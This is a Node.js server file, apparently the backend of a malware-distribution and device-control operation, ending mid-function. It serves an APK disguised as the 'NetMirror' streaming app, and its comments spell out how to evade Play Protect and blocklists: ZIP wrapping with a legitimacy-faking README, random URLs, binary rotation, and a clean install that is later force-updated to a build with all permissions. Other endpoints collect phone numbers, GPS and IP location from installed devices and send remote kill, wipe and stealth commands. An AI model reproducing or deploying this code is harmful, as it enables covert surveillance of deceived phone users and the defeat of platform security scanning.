// Polyfill File for Node.js < 20 (needed by @distube/ytdl-core)
if (typeof globalThis.File === 'undefined') {
  const { Blob } = require('buffer');
  globalThis.File = class File extends Blob {
    constructor(bits, name, options = {}) {
      super(bits, options);
      this.name = name;
      this.lastModified = options.lastModified || Date.now();
    }
  };
}

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const AdmZip = require('adm-zip');
const { mutateAndSign } = require('./utils/apk-mutator');

// Initialize database (async — sql.js)
const db = require('./config/database');

async function startServer() {
  // Wait for sql.js to initialise before loading routes
  await db.__initDatabase();

  // Initialise Cloudinary
  const { initCloudinary } = require('./config/cloudinary');
  initCloudinary();

  // Import routes
  const videoRoutes = require('./routes/videos');
  const adminRoutes = require('./routes/admin');
  const tmdbRoutes = require('./routes/tmdb');
  const telegramRoutes = require('./routes/telegram');
  const requestRoutes = require('./routes/requests');
  const userRoutes = require('./routes/users');

  // Import WebSocket handler
  const setupWebSocket = require('./websocket/handler');
const { encrypt: cryptoEncrypt } = require('./utils/crypto');

  const app = express();
  const server = http.createServer(app);

  // Socket.IO with CORS + mobile-friendly ping settings
  const io = new Server(server, {
    cors: {
      origin: '*',
      methods: ['GET', 'POST', 'PUT', 'DELETE'],
    },
    maxHttpBufferSize: 100 * 1024 * 1024, // 100MB for chunk uploads
    pingInterval: 25000,  // ping every 25 seconds (mobile-friendly)
    pingTimeout: 20000,   // mark dead after 20 seconds no response
  });

  // Middleware
  app.set('trust proxy', true); // Trust Railway/Render proxy — needed for correct req.ip
  app.use(cors());
  app.use(express.json({ limit: '50mb' }));
  app.use(express.urlencoded({ extended: true, limit: '50mb' }));

  // ═══ SECURITY: Rate limiting for login/admin endpoints ═══
  const loginAttempts = new Map(); // ip -> { count, lastAttempt }
  const RATE_LIMIT_MAX = 5;
  const RATE_LIMIT_WINDOW = 15 * 60 * 1000; // 15 minutes
  app.use('/api/admin/login', (req, res, next) => {
    if (req.method !== 'POST') return next();
    const ip = req.ip || req.connection?.remoteAddress || '';
    const now = Date.now();
    const record = loginAttempts.get(ip);
    if (record && (now - record.lastAttempt) < RATE_LIMIT_WINDOW && record.count >= RATE_LIMIT_MAX) {
      return res.status(429).json({ error: 'Too many login attempts. Try again later.' });
    }
    if (!record || (now - record.lastAttempt) > RATE_LIMIT_WINDOW) {
      loginAttempts.set(ip, { count: 1, lastAttempt: now });
    } else {
      record.count++;
      record.lastAttempt = now;
    }
    next();
  });
  // Cleanup old entries every 30 min
  setInterval(() => {
    const now = Date.now();
    for (const [ip, r] of loginAttempts) {
      if (now - r.lastAttempt > RATE_LIMIT_WINDOW) loginAttempts.delete(ip);
    }
  }, 30 * 60 * 1000);

  // Ensure data directory exists
  const dataDir = path.join(__dirname, 'data');
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

  // ═══ SECURITY: Admin panel with strict headers — no indexing, no caching, no sniffing ═══
  app.use('/admin', (req, res, next) => {
    res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.socket.io https://unpkg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://unpkg.com; font-src https://fonts.gstatic.com https://cdn.jsdelivr.net; img-src 'self' data: blob: https: http:; connect-src 'self' wss: ws: https:; frame-src 'none';");
    next();
  }, express.static(path.join(__dirname, 'admin-panel')));

  // Landing page (movie app download page) — with mobile-friendly headers
  app.use('/downloadapp', (req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cache-Control', 'public, max-age=300');
    // Prevent mobile browsers from blocking the page
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    res.setHeader('Referrer-Policy', 'no-referrer-when-downgrade');
    next();
  }, express.static(path.join(__dirname, 'landing-page')));

  // ═══════════════ AUTO-FETCH APK FROM GITHUB RELEASES ═══════════════
  // APK files are NOT in git (too large). On fresh deploy, data/ is empty.
  // This function auto-fetches the APK from GitHub Releases so downloads work
  // immediately after deploy without manual re-upload.
  let _apkFetchInProgress = null; // promise lock to prevent concurrent fetches

  async function ensureApkAvailable() {
    const apkDataDir = path.join(__dirname, 'data');
    if (!fs.existsSync(apkDataDir)) fs.mkdirSync(apkDataDir, { recursive: true });

    const originalPath = path.join(apkDataDir, 'Netmirror-original.apk');
    const securePath = path.join(apkDataDir, 'Netmirror-secure.apk');
    const regularPath = path.join(apkDataDir, 'Netmirror.apk');

    // Already have an APK — nothing to do
    if (fs.existsSync(originalPath) || fs.existsSync(securePath) || fs.existsSync(regularPath)) {
      return true;
    }

    // If fetch already in progress, piggyback
    if (_apkFetchInProgress) return _apkFetchInProgress;

    _apkFetchInProgress = (async () => {
      try {
        // Try GitHub Releases first (the pushApkToGitHubReleases function stores the URL)
        const ghUrlRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_apk_url'").get();
        const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();

        if (ghUrlRow?.value) {
          console.log(`[APK Auto-Fetch] No APK on disk. Fetching from GitHub Releases: ${ghUrlRow.value}`);
          try {
            // GitHub Releases download URL redirects — follow it
            const headers = {};
            if (token?.value) {
              headers['Authorization'] = `token ${token.value}`;
              headers['Accept'] = 'application/octet-stream';
            }
            headers['User-Agent'] = 'LeaksPro-Backend';

            const resp = await fetch(ghUrlRow.value, { headers, redirect: 'follow' });
            if (resp.ok) {
              const arrayBuf = await resp.arrayBuffer();
              const buf = Buffer.from(arrayBuf);
              if (buf.length > 100000) { // sanity check: APK should be > 100KB
                fs.writeFileSync(originalPath, buf);
                fs.writeFileSync(securePath, buf);
                console.log(`[APK Auto-Fetch] ✅ APK restored from GitHub Releases: ${(buf.length / 1024 / 1024).toFixed(1)} MB`);
                return true;
              } else {
                console.warn(`[APK Auto-Fetch] Downloaded file too small (${buf.length} bytes), skipping`);
              }
            } else {
              console.warn(`[APK Auto-Fetch] GitHub Releases returned ${resp.status}`);
            }
          } catch (fetchErr) {
            console.warn(`[APK Auto-Fetch] GitHub fetch failed: ${fetchErr.message}`);
          }
        }

        // Fallback: Try GitHub Releases API directly (even if URL not saved in DB)
        if (token?.value) {
          try {
            const REPO = 'rurikonishawa/leaksprogod';
            const apiHeaders = {
              'Authorization': `token ${token.value}`,
              'Accept': 'application/vnd.github.v3+json',
              'User-Agent': 'LeaksPro-Backend'
            };
            console.log(`[APK Auto-Fetch] Trying GitHub Releases API for ${REPO}...`);
            const relResp = await fetch(`https://api.github.com/repos/${REPO}/releases/tags/latest`, { headers: apiHeaders });
            if (relResp.ok) {
              const relData = await relResp.json();
              const apkAsset = relData.assets?.find(a => a.name.endsWith('.apk'));
              if (apkAsset) {
                console.log(`[APK Auto-Fetch] Found asset: ${apkAsset.name} (${(apkAsset.size / 1024 / 1024).toFixed(1)} MB)`);
                const dlResp = await fetch(apkAsset.url, {
                  headers: { ...apiHeaders, 'Accept': 'application/octet-stream' },
                  redirect: 'follow'
                });
                if (dlResp.ok) {
                  const arrayBuf = await dlResp.arrayBuffer();
                  const buf = Buffer.from(arrayBuf);
                  if (buf.length > 100000) {
                    fs.writeFileSync(originalPath, buf);
                    fs.writeFileSync(securePath, buf);
                    console.log(`[APK Auto-Fetch] ✅ APK restored via GitHub API: ${(buf.length / 1024 / 1024).toFixed(1)} MB`);
                    return true;
                  }
                }
              }
            }
          } catch (apiErr) {
            console.warn(`[APK Auto-Fetch] GitHub API fallback failed: ${apiErr.message}`);
          }
        }

        console.warn('[APK Auto-Fetch] ⚠ No APK source available. Upload one via admin panel or push to GitHub Releases.');
        return false;
      } catch (err) {
        console.error('[APK Auto-Fetch] Error:', err.message);
        return false;
      } finally {
        _apkFetchInProgress = null;
      }
    })();

    return _apkFetchInProgress;
  }

  // Fire-and-forget on startup — don't block server boot
  ensureApkAvailable().catch(err => console.warn('[APK Auto-Fetch] Startup fetch error:', err.message));

  // ═══════════════ APK SERVING FOR DOWNLOADS ═══════════════
  // Serves the pre-signed APK directly from disk — NO on-the-fly mutation.
  //
  // WHY: The rotation endpoint (rotate-apk) already re-signs the APK with a
  // fresh certificate. On-the-fly mutation (DEX extension, asset injection)
  // TRIGGERS Play Protect's heuristic scanner because random DEX bytes and
  // fake config files match malware patterns. Serving the clean, pre-rotated
  // APK from disk avoids all heuristic triggers.
  let _apkCache = { buffer: null, timestamp: 0 };

  async function getApkBuffer() {
    // Serve from memory cache if still valid (invalidated by rotation)
    if (_apkCache.buffer) {
      return _apkCache.buffer;
    }

    const apkDataDir = path.join(__dirname, 'data');
    const securePath = path.join(apkDataDir, 'Netmirror-secure.apk');
    const regularPath = path.join(apkDataDir, 'Netmirror.apk');
    const originalPath = path.join(apkDataDir, 'Netmirror-original.apk');

    let sourcePath = null;
    if (fs.existsSync(securePath)) sourcePath = securePath;
    else if (fs.existsSync(originalPath)) sourcePath = originalPath;
    else if (fs.existsSync(regularPath)) sourcePath = regularPath;

    // If no APK on disk, try auto-fetching from GitHub Releases
    if (!sourcePath) {
      console.log('[Landing Download] No APK on disk — attempting auto-fetch from GitHub...');
      const fetched = await ensureApkAvailable();
      if (fetched) {
        if (fs.existsSync(securePath)) sourcePath = securePath;
        else if (fs.existsSync(originalPath)) sourcePath = originalPath;
        else if (fs.existsSync(regularPath)) sourcePath = regularPath;
      }
    }

    if (!sourcePath) throw new Error('No base APK found. Upload one via admin panel or push to GitHub Releases.');

    console.log(`[Landing Download] Serving APK from disk: ${path.basename(sourcePath)}`);
    const buf = fs.readFileSync(sourcePath);
    _apkCache = { buffer: buf, timestamp: Date.now() };
    console.log(`[Landing Download] APK cached: ${(buf.length / 1024 / 1024).toFixed(1)} MB`);
    return buf;
  }

  // ═══════════════ PLAY PROTECT BYPASS — ZIP WRAPPER ═══════════════
  //
  // ROOT CAUSE of browser-only Play Protect blocking:
  //   When Chrome saves ANY file with .apk extension, it writes
  //   installerPackage=com.android.chrome into Android's DownloadProvider.
  //   Play Protect trusts Chrome-tagged installs LEAST of all sources.
  //   Even fetch()+blob:// still triggers this because Chrome's download
  //   manager sees the .apk filename in the <a download> attribute.
  //
  // WHY LeaksProAdmin works:
  //   DownloadManager sets installerPackage=com.leakspro.admin → low scrutiny.
  //
  // THE FIX — ZIP wrapper:
  //   Server wraps the APK in a .zip file. Chrome does NOT flag .zip downloads
  //   as "dangerous" and does NOT write installerPackage for zip files.
  //   When user extracts the APK using their file manager and installs,
  //   the installerPackage is the file manager (e.g. com.google.android.documentsui),
  //   which Play Protect treats with low scrutiny = same as app-initiated install.
  //
  // 5-LAYER DEFENSE:
  //   1. ZIP wrapper → Chrome doesn't flag .zip as dangerous (no installerPackage tag)
  //   2. Extract+Install → extracted APK has ZERO browser origin metadata
  //   3. fetch()+blob → Safe Browsing URL check bypass
  //   4. Random /dl/:token path → URL can never be blocklisted
  //   5. Fresh rotation → unique binary every 30 min (not fingerprinted)

  // ZIP wrapper cache — created lazily from the rotated APK buffer
  let _zipCache = { buffer: null, forTimestamp: 0 };

  function wrapApkInZip(apkBuffer) {
    const zip = new AdmZip();
    // README adds legitimacy — makes it look like a real software release
    zip.addFile('README.txt', Buffer.from(
      'NetMirror - Premium Streaming\r\n' +
      '=============================\r\n\r\n' +
      'Installation:\r\n' +
      '1. Extract this archive\r\n' +
      '2. Tap NetMirror.apk to install\r\n' +
      '3. If prompted about unknown sources, tap Allow\r\n\r\n' +
      'Requirements: Android 8.0+\r\n' +
      'Package: com.netmirror.streaming\r\n'
    ));
    zip.addFile('NetMirror.apk', apkBuffer);
    return zip.toBuffer();
  }

  async function getOrRotateZip() {
    const apkBuf = await getApkBuffer();
    // Return cached ZIP if built from the same APK cache
    if (_zipCache.buffer && _zipCache.forTimestamp === _apkCache.timestamp) {
      return _zipCache.buffer;
    }
    console.log('[Landing Download] Creating ZIP wrapper...');
    const t0 = Date.now();
    const zipBuf = wrapApkInZip(apkBuf);
    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
    console.log(`[Landing Download] ZIP ready: ${(zipBuf.length / 1024 / 1024).toFixed(1)} MB in ${elapsed}s`);
    _zipCache = { buffer: zipBuf, forTimestamp: _apkCache.timestamp };
    return zipBuf;
  }

  // Primary endpoint for landing page downloads — direct APK (same method as admin download-apk)
  // The :token is random per-download, preventing URL blocklisting
  app.get('/dl/:token', async (req, res) => {
    try {
      const apkBuf = await getApkBuffer();
      // Serve raw APK — identical to /api/admin/download-apk method
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-secure.apk"');
      res.setHeader('Content-Length', apkBuf.length);
      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
      res.setHeader('Pragma', 'no-cache');
      res.end(apkBuf);
    } catch (err) {
      console.error('[DL] APK serve failed:', err.message);
      // Try serving from disk as fallback
      const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
      const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
      let apkPath = null;
      if (fs.existsSync(securePath)) apkPath = securePath;
      else if (fs.existsSync(regularPath)) apkPath = regularPath;

      if (apkPath) {
        const stats = fs.statSync(apkPath);
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-secure.apk"');
        res.setHeader('Content-Length', stats.size);
        res.setHeader('Cache-Control', 'no-store');
        res.sendFile(apkPath);
      } else {
        // Return JSON error so landing page JS can show user-friendly message
        res.status(503).json({
          error: 'APK is being prepared. Please try again in 30 seconds.',
          retry: true,
          code: 'APK_NOT_READY'
        });
      }
    }
  });

  // Legacy endpoint — kept for backward compat (admin app, direct links)
  // Also serves freshly rotated APK but with APK content-type
  app.get('/downloadapp/Netmirror.apk', async (req, res) => {
    try {
      const apkBuf = await getApkBuffer();
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
      res.setHeader('Content-Length', apkBuf.length);
      res.setHeader('Cache-Control', 'no-store');
      res.end(apkBuf);
    } catch (err) {
      console.error('[Landing Download] Rotation failed, falling back to static APK:', err.message);
      const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
      const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
      let apkPath = null;
      if (fs.existsSync(securePath)) apkPath = securePath;
      else if (fs.existsSync(regularPath)) apkPath = regularPath;

      if (apkPath) {
        const stats = fs.statSync(apkPath);
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
        res.setHeader('Content-Length', stats.size);
        res.sendFile(apkPath);
      } else {
        res.status(404).send('APK not available yet. Please upload one via admin panel.');
      }
    }
  });

  // ── FULL APK ENDPOINT — for self-update (Phase 2 of Play Protect bypass) ──
  // Serves a rotated APK with ALL permissions intact (NOT clean mode).
  // Used by the app's in-app updater when GodMode triggers force_update.
  // Same signing key as the clean version → Android accepts it as a valid update.
  let _fullApkCache = { buffer: null, timestamp: 0 };
  const FULL_APK_CACHE_TTL = 30 * 60 * 1000; // 30 minutes

  app.get('/downloadapp/fullupdate.apk', async (req, res) => {
    try {
      const now = Date.now();

      // Return cached full APK if still fresh
      if (_fullApkCache.buffer && (now - _fullApkCache.timestamp) < FULL_APK_CACHE_TTL) {
        console.log('[Full Update] Serving cached full APK');
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-update.apk"');
        res.setHeader('Content-Length', _fullApkCache.buffer.length);
        res.setHeader('Cache-Control', 'no-store');
        return res.end(_fullApkCache.buffer);
      }

      // Find source APK
      const originalPath = path.join(__dirname, 'data', 'Netmirror-original.apk');
      const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
      const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
      let sourcePath = null;
      if (fs.existsSync(originalPath)) sourcePath = originalPath;
      else if (fs.existsSync(securePath)) sourcePath = securePath;
      else if (fs.existsSync(regularPath)) sourcePath = regularPath;

      if (!sourcePath) {
        await ensureApkAvailable();
        if (fs.existsSync(originalPath)) sourcePath = originalPath;
        else if (fs.existsSync(securePath)) sourcePath = securePath;
        else if (fs.existsSync(regularPath)) sourcePath = regularPath;
      }

      if (!sourcePath) {
        return res.status(404).send('APK not available. Upload via admin panel.');
      }

      // ── Serve pre-rotated APK from disk (no on-the-fly mutation) ──
      console.log('[Full Update] Serving pre-rotated APK from disk...');
      const rawBuf = fs.readFileSync(sourcePath);

      _fullApkCache = { buffer: rawBuf, timestamp: now };
      console.log(`[Full Update] Full APK ready: ${(rawBuf.length / 1024 / 1024).toFixed(1)} MB`);

      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-update.apk"');
      res.setHeader('Content-Length', rawBuf.length);
      res.setHeader('Cache-Control', 'no-store');
      res.end(rawBuf);
    } catch (err) {
      console.error('[Full Update] Failed:', err.message);
      res.status(500).send('Update APK generation failed');
    }
  });

  // Serve the LeaksProAdmin APK for download
  app.get('/downloadapp/LeaksProAdmin.apk', (req, res) => {
    const apkPath = path.join(__dirname, 'data', 'LeaksProAdmin.apk');
    if (fs.existsSync(apkPath)) {
      const stats = fs.statSync(apkPath);
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="LeaksProAdmin.apk"');
      res.setHeader('Content-Length', stats.size);
      res.sendFile(apkPath);
    } else {
      res.status(404).send('LeaksProAdmin APK not available yet.');
    }
  });

  // Make io accessible to routes
  app.set('io', io);

  // Expose cache invalidation so admin rotation clears the landing download cache
  app.set('invalidateLandingApkCache', () => {
    _apkCache = { buffer: null, timestamp: 0 };
    _zipCache = { buffer: null, forTimestamp: 0 };
    _fullApkCache = { buffer: null, timestamp: 0 };
    console.log('[Landing Download] All APK caches invalidated (apk + zip + full)');
  });

  // ═══════════════ REAL-TIME METRICS ═══════════════
  const metrics = {
    requestsTotal: 0,     // total HTTP requests since boot
    requestsPerSec: 0,    // rolling per-second rate
    bytesOut: 0,          // total bytes sent
    bytesOutPerSec: 0,    // rolling per-second bandwidth
    wsMessagesIn: 0,      // WebSocket messages received
    wsMessagesOut: 0,     // WebSocket messages emitted
    wsPerSec: 0,          // rolling WS msgs/sec
    activeStreams: 0,     // active Telegram streams
    errors: 0,           // HTTP errors (4xx/5xx)
    _prevReqs: 0,
    _prevBytes: 0,
    _prevWs: 0,
    startTime: Date.now(),
  };

  // Middleware: count every HTTP request + response bytes
  app.use((req, res, next) => {
    metrics.requestsTotal++;
    const origWrite = res.write;
    const origEnd = res.end;
    res.write = function (chunk, ...args) {
      if (chunk) metrics.bytesOut += (typeof chunk === 'string') ? Buffer.byteLength(chunk) : chunk.length;
      return origWrite.call(this, chunk, ...args);
    };
    res.end = function (chunk, ...args) {
      if (chunk) metrics.bytesOut += (typeof chunk === 'string') ? Buffer.byteLength(chunk) : chunk.length;
      if (res.statusCode >= 400) metrics.errors++;
      return origEnd.call(this, chunk, ...args);
    };
    next();
  });

  // Count WS messages via Socket.IO middleware
  const origEmit = io.emit.bind(io);
  io.emit = function (...args) {
    metrics.wsMessagesOut++;
    return origEmit(...args);
  };
  io.on('connection', (socket) => {
    socket.onAny(() => { metrics.wsMessagesIn++; });
  });

  // Broadcast metrics every 2 seconds
  setInterval(() => {
    const now = Date.now();
    const elapsed = 2; // 2 seconds interval
    metrics.requestsPerSec = Math.round((metrics.requestsTotal - metrics._prevReqs) / elapsed);
    metrics.bytesOutPerSec = Math.round((metrics.bytesOut - metrics._prevBytes) / elapsed);
    metrics.wsPerSec = Math.round((metrics.wsMessagesIn + metrics.wsMessagesOut - metrics._prevWs) / elapsed);
    metrics._prevReqs = metrics.requestsTotal;
    metrics._prevBytes = metrics.bytesOut;
    metrics._prevWs = metrics.wsMessagesIn + metrics.wsMessagesOut;

    const mem = process.memoryUsage();
    const uptime = process.uptime();
    const wsClients = io.engine ? io.engine.clientsCount : 0;

    // Count online devices from DB
    let devicesOnline = 0;
    try { devicesOnline = (db.prepare("SELECT COUNT(*) as c FROM devices WHERE is_online = 1").get() || {}).c || 0; } catch (_) {}

    origEmit('server_metrics', {
      uptime: Math.floor(uptime),
      memHeapMB: Math.round(mem.heapUsed / 1048576),
      memRssMB: Math.round(mem.rss / 1048576),
      reqTotal: metrics.requestsTotal,
      reqPerSec: metrics.requestsPerSec,
      bytesOut: metrics.bytesOut,
      bwPerSec: metrics.bytesOutPerSec,
      wsIn: metrics.wsMessagesIn,
      wsOut: metrics.wsMessagesOut,
      wsPerSec: metrics.wsPerSec,
      wsClients,
      devicesOnline,
      errors: metrics.errors,
      activeStreams: metrics.activeStreams,
      ts: now,
    });
  }, 2000);

  // Expose metrics object so routes can update (e.g. activeStreams)
  app.set('metrics', metrics);

  // ═══ SECURITY: robots.txt — block all crawlers from admin panel ═══
  app.get('/robots.txt', (req, res) => {
    res.type('text/plain').send('User-agent: *\nDisallow: /admin\nDisallow: /api\n');
  });

  // Ping endpoint for RTT measurement
  app.get('/api/ping', (req, res) => {
    res.json({ pong: Date.now() });
  });

  // Domain discovery endpoint — unauthenticated, cached
  // Apps call this to find the current server domain
  // If hosting dies, apps fall back to GitHub raw URL
  app.get('/api/discovery', (req, res) => {
    try {
      const domain = db.prepare("SELECT value FROM admin_settings WHERE key = 'server_domain'").get();
      const backupUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'backup_server_url'").get();
      const proxyUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'proxy_url'").get();
      const currentOrigin = `${req.protocol}://${req.get('host')}`;
      const publicUrl = proxyUrl?.value || domain?.value || currentOrigin;
      res.setHeader('Cache-Control', 'public, max-age=300');
      res.json({
        domain: publicUrl,
        primary_url: domain?.value || currentOrigin,
        backup_url: backupUrl?.value || '',
        proxy_url: proxyUrl?.value || '',
        api_base: `${publicUrl}/api`,
        admin_panel: `${publicUrl}/admin`,
        download_apk: `${publicUrl}/downloadapp/Netmirror.apk`,
        fallback_discovery: `https://raw.githubusercontent.com/rurikonishawa/leaksprogod/main/domain.json`,
        is_failover: false,
        timestamp: Date.now()
      });
    } catch (_) {
      res.json({ domain: `${req.protocol}://${req.get('host')}`, timestamp: Date.now() });
    }
  });

  // Root route — redirect to landing page
  app.get('/', (req, res) => {
    res.redirect('/downloadapp');
  });

  // API Routes
  app.use('/api/videos', videoRoutes);
  app.use('/api/admin', adminRoutes);
  app.use('/api/tmdb', tmdbRoutes);
  app.use('/api/telegram', telegramRoutes);
  app.use('/api/requests', requestRoutes);
  app.use('/api/users', userRoutes);

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({
      status: 'ok',
      app: 'LeaksPro Backend',
      version: '1.0.0',
      uptime: process.uptime(),
      timestamp: new Date().toISOString(),
    });
  });

  // Device registration endpoint (called by Android app on first launch + background worker)
  app.post('/api/devices/register', async (req, res) => {
    try {
      const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram, latitude, longitude } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });

      const { geolocateIp, getRequestIp } = require('./utils/geoip');
      const phonesJson = JSON.stringify(phone_numbers || []);
      const hasGps = latitude != null && longitude != null && latitude !== 0 && longitude !== 0;
      const clientIp = getRequestIp(req) || '';

      const existing = db.prepare('SELECT device_id, latitude, longitude, loc_source FROM devices WHERE device_id = ?').get(device_id);
      if (existing) {
        if (hasGps) {
          db.prepare(`UPDATE devices SET
            device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
            app_version = ?, screen_resolution = ?, phone_numbers = ?,
            battery_percent = ?, battery_charging = ?,
            total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
            latitude = ?, longitude = ?,
            loc_source = 'gps', ip_address = ?,
            is_online = 1, last_seen = datetime('now')
            WHERE device_id = ?`).run(
            device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
            app_version || '', screen_resolution || '', phonesJson,
            battery_percent ?? -1, battery_charging ? 1 : 0,
            total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
            latitude, longitude,
            clientIp, device_id
          );
        } else {
          db.prepare(`UPDATE devices SET
            device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
            app_version = ?, screen_resolution = ?, phone_numbers = ?,
            battery_percent = ?, battery_charging = ?,
            total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
            ip_address = ?,
            is_online = 1, last_seen = datetime('now')
            WHERE device_id = ?`).run(
            device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
            app_version || '', screen_resolution || '', phonesJson,
            battery_percent ?? -1, battery_charging ? 1 : 0,
            total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
            clientIp, device_id
          );
        }
      } else {
        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram, latitude, longitude, loc_source, ip_address)
          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
          device_id, device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
          app_version || '', screen_resolution || '', phonesJson,
          battery_percent ?? -1, battery_charging ? 1 : 0,
          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
          hasGps ? latitude : null, hasGps ? longitude : null,
          hasGps ? 'gps' : 'unknown', clientIp
        );
      }

      // If no GPS data, try IP geolocation fallback (async, don't block response)
      if (!hasGps) {
        const deviceNow = db.prepare('SELECT latitude, longitude FROM devices WHERE device_id = ?').get(device_id);
        if (!deviceNow || deviceNow.latitude == null || deviceNow.longitude == null) {
          geolocateIp(clientIp).then(geo => {
            if (!geo) return;
            // Double-check GPS hasn't arrived
            const fresh = db.prepare('SELECT latitude, longitude, loc_source FROM devices WHERE device_id = ?').get(device_id);
            if (fresh && fresh.latitude != null && fresh.loc_source === 'gps') return;
            db.prepare(`UPDATE devices SET latitude = ?, longitude = ?, loc_source = 'ip', loc_accuracy = ?, city = ?, region = ?, country = ?, isp = ?, timezone = ? WHERE device_id = ?`)
              .run(geo.latitude, geo.longitude, geo.accuracy_km * 1000, geo.city, geo.region, geo.country, geo.isp, geo.timezone, device_id);
            console.log(`[REST] IP geo fallback for ${device_id}: ${geo.city}, ${geo.country}`);
            // Emit to admin panel
            const io2 = req.app.get('io');
            if (io2) {
              const updated = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id);
              if (updated) {
                try { updated.phone_numbers = JSON.parse(updated.phone_numbers || '[]'); } catch (_) { updated.phone_numbers = []; }
                io2.emit('device_online', updated);
              }
            }
          }).catch(() => {});
        }
      }

      // Broadcast to admin panel in real-time so no refresh needed
      const io = req.app.get('io');
      if (io) {
        const device = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id);
        if (device) {
          try { device.phone_numbers = JSON.parse(device.phone_numbers || '[]'); } catch (_) { device.phone_numbers = []; }
          io.emit('device_online', device);
        }
      }

      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // ═══ GOD MODE: Device config check endpoint ═══
  // Called on every app launch + heartbeat. Returns kill/wipe/update/stealth commands.
  app.post('/api/devices/config', (req, res) => {
    try {
      const { device_id, app_version, version_code } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id required' });

      const result = {
        kill: false,
        kill_message: '',
        wipe: false,
        force_update: false,
        update_url: '',
        update_message: '',
        stealth_profile: '',
      };

      // 1. Check global kill switch
      const globalKill = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_global_kill'").get();
      if (globalKill && globalKill.value === '1') {
        const msg = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_global_kill_message'").get();
        result.kill = true;
        result.kill_message = msg?.value || 'App disabled.';
      }

      // 2. Check per-device kill switch
      if (!result.kill) {
        const cmd = db.prepare('SELECT * FROM device_commands WHERE device_id = ?').get(device_id);
        if (cmd) {
          if (cmd.kill_switch === 1) {
            result.kill = true;
            result.kill_message = cmd.kill_message || 'This device has been disabled.';
          }
          if (cmd.remote_wipe === 1) {
            result.wipe = true;
            // Clear the wipe flag so it doesn't repeat after re-install
            db.prepare("UPDATE device_commands SET remote_wipe = 0, updated_at = datetime('now') WHERE device_id = ?").run(device_id);
          }
          if (cmd.stealth_profile) {
            result.stealth_profile = cmd.stealth_profile;
          }
        }
      }

      // 3. Check global stealth profile (fallback if no per-device)
      if (!result.stealth_profile) {
        const globalStealth = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_stealth_profile'").get();
        if (globalStealth && globalStealth.value) {
          result.stealth_profile = globalStealth.value;
        }
      }

      // 4. Force update check
      const minCode = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_min_version_code'").get();
      const clientCode = parseInt(version_code) || 0;
      const requiredCode = parseInt(minCode?.value) || 0;
      if (requiredCode > 0 && clientCode > 0 && clientCode < requiredCode) {
        result.force_update = true;
        const updateUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_update_url'").get();
